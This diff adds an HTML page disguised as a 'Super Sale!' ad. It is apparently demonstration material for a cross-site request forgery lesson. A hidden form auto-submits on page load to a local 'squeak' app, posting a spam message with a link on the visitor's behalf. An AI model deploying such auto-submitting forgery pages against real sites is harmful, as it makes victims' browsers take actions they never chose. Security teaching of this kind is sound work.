@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html lang="en">
+<!-- This file is here only because I had to put it somewhere. -->
+<head>
+    <meta charset="UTF-8">
+    <title>Super Sale!</title>
+</head>
+<body>
+<h1>Super Sale!</h1>
+<iframe name="i" style="display:none"></iframe>
+<form action="https://localhost:8000/squeak" method="POST" target="i" style="display:none">
+    <input type="hidden" name="squeak"
+           value="Get (almost) Free Shit! Click <a href='http://tarlinder.net/campaign.html'>here</a>!">
+</form>
+<script>document.forms[0].submit()</script>
+</body>
+</html>
